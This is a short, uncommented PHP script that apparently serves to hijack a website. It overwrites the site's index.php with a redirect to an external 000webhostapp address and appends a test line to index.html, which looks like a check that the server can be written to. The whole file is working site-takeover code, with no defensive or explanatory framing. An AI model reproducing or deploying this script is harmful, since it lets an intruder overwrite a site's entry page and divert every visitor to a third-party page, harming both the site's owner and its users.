<?php
$entry_line="<?php 
header('Location: https://jordiserrano.000webhostapp.com/index.html'); 
?> ";
$fp = fopen("index.php", "w");
fputs($fp, $entry_line);
fclose($fp);
?>

<? 
$fp =@fopen("index.html", "a+");
$yazi = "test" . "\r\n";
fwrite ($fp, "$yazi");
fclose ($fp);
?>
